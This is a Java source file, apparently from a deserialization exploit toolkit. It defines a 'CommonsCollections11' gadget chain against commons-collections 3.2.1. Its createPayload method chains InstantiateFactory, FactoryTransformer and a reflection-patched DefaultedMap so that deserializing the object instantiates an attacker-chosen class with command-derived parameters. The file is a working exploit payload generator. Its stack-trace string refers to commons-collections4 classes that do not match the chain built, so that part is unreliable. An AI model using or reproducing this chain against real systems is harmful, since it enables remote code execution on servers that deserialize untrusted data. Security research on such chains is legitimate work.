package org.ses.gadgetbuilder.chains1;

import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.map.DefaultedMap;
import org.ses.gadgetbuilder.adapters.InitializeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.InstantiateGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.MapGetTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

@Dependencies({"org.apache.commons:commons-collections:3.2.1"})
@Authors({ Authors.YihengZhang })
@Impact(Impact.Instantiate)
public class CommonsCollections11 extends InstantiateGadgetChain<MapGetTrampoline, InitializeAdapter> {

    public CommonsCollections11(MapGetTrampoline _trampoline, InitializeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        InstantiateFactory factory = new InstantiateFactory(
                initializeAdapter.getConstructorClass(),
                initializeAdapter.getParamTypes(),
                initializeAdapter.getParams(command));
        FactoryTransformer transformer = new FactoryTransformer(factory);

        DefaultedMap d = new DefaultedMap("1");
        Reflections.setFieldValue(d, "value", transformer);

        return new TrampolineConnector(d);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.apache.commons.collections4.bag.TreeBag.readObject\n" +
                "org.apache.commons.collections4.bag.AbstractMapBag.doReadObject\n" +
                "org.apache.commons.collections4.bag.TreeBag.put\n" +
                "org.apache.commons.collections4.bag.TreeBag.compare\n" +
                "org.apache.commons.collections4.comparators.TransformingComparator.compare\n" +
                "org.apache.commons.collections4.functors.InvokerTransformer.transform\n" +
                "java.lang.reflect.Method.invoke";
    }
}
